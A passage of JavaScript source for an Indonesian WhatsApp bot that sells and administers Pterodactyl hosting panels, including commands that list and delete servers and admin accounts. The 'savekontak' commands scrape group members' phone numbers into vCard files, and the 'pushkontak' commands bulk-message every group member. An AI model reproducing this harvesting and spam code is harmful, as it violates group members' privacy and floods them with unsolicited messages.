       ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
*​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await danz.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await danz.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "delpanelbutton": {
let kontol = new Array()
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status
let namanya = `${s.name}`
let idnya = `${s.id} ⚡`
let ramnya = `${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}`
let cpunya = `${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`
let disknya = `${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}`
await kontol.push({ 
header: `ID Server ${idnya}`, title: `Nama Server : ${namanya}`, description: `Ram ${ramnya} | Cpu ${cpunya} | Disk ${disknya}`, id: `.respon_delpanel ${idnya}`})
}
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: '\nSilahkan Pilih Server Panel Yang Ingin Dihapus'
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Powered by DanzHosting`
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Total Server Panel : ${res.meta.pagination.count} Server",
rows: ${JSON.stringify(kontol)}
}]}`
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"List Server Panel\",\"title\":\"List Panel\",\"id\":\".listpanel\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(messii.key.remoteJid, messii.message, { 
messageId: messii.key.id 
})
}
break

case "delpanelbuttonV2": {
let kontol = new Array()
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status
let namanya = `${s.name}`
let idnya = `${s.id} ⚡`
let ramnya = `${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}`
let cpunya = `${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`
let disknya = `${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}`
await kontol.push({ 
header: `ID Server ${idnya}`, title: `Nama Server : ${namanya}`, description: `Ram ${ramnya} | Cpu ${cpunya} | Disk ${disknya}`, id: `.respon_delpanel ${idnya}`})
}
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: '\nSilahkan Pilih Server Panel Yang Ingin Dihapus'
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Powered by DanzHosting`
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Total Server Panel : ${res.meta.pagination.count} Server",
rows: ${JSON.stringify(kontol)}
}]}`
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"List Server Panel\",\"title\":\"List Panel\",\"id\":\".listpanel-V2\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(messii.key.remoteJid, messii.message, { 
messageId: messii.key.id 
})
}
break

case "delpanelbuttonV3": {
let kontol = new Array()
let f = await fetch(domainV3 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV3 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV3
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status
let namanya = `${s.name}`
let idnya = `${s.id} ⚡`
let ramnya = `${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}`
let cpunya = `${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`
let disknya = `${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}`
await kontol.push({ 
header: `ID Server ${idnya}`, title: `Nama Server : ${namanya}`, description: `Ram ${ramnya} | Cpu ${cpunya} | Disk ${disknya}`, id: `.respon_delpanel ${idnya}`})
}
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: '\nSilahkan Pilih Server Panel Yang Ingin Dihapus'
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Powered by DanzHosting`
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Total Server Panel : ${res.meta.pagination.count} Server",
rows: ${JSON.stringify(kontol)}
}]}`
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"List Server Panel\",\"title\":\"List Panel\",\"id\":\".listpanel-V3\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(messii.key.remoteJid, messii.message, { 
messageId: messii.key.id 
})
}
break

case "delpanelbuttonV4": {
let kontol = new Array()
let f = await fetch(domainV4 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV4 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV4
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status
let namanya = `${s.name}`
let idnya = `${s.id} ⚡`
let ramnya = `${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}`
let cpunya = `${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`
let disknya = `${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}`
await kontol.push({ 
header: `ID Server ${idnya}`, title: `Nama Server : ${namanya}`, description: `Ram ${ramnya} | Cpu ${cpunya} | Disk ${disknya}`, id: `.respon_delpanel ${idnya}`})
}
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: '\nSilahkan Pilih Server Panel Yang Ingin Dihapus'
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Powered by DanzHosting`
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Total Server Panel : ${res.meta.pagination.count} Server",
rows: ${JSON.stringify(kontol)}
}]}`
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"List Server Panel\",\"title\":\"List Panel\",\"id\":\".listpanel-V4\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(messii.key.remoteJid, messii.message, { 
messageId: messii.key.id 
})
}
break

case "delpanelbuttonV5": {
let kontol = new Array()
let f = await fetch(domainV5 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV5 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV5
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status
let namanya = `${s.name}`
let idnya = `${s.id} ⚡`
let ramnya = `${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}`
let cpunya = `${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`
let disknya = `${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}`
await kontol.push({ 
header: `ID Server ${idnya}`, title: `Nama Server : ${namanya}`, description: `Ram ${ramnya} | Cpu ${cpunya} | Disk ${disknya}`, id: `.respon_delpanel ${idnya}`})
}
let messii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: '\nSilahkan Pilih Server Panel Yang Ingin Dihapus'
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Powered by DanzHosting`
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "- Total Server Panel : ${res.meta.pagination.count} Server",
rows: ${JSON.stringify(kontol)}
}]}`
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"List Server Panel\",\"title\":\"List Panel\",\"id\":\".listpane-V5l\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(messii.key.remoteJid, messii.message, { 
messageId: messii.key.id 
})
}
break
//================================================================================

case "produk": {
await slideButton(m.chat)
}
break

//================================================================================

case "savekontak": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await danz.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer danz - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await danz.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer danz - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await danz.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idgrup|pesannya"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya"))
const [idgc, pes] = text.split("|")
const teks = pes
const jidawal = m.chat
const data = await danz.groupMetadata(id)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentmess  = await danz.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await danz.sendMessage(mem, {text: teks}, {quoted: sentmess })
await sleep(global.delayPushkontak)
}}

await danz.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "pushkontak2": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await danz.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
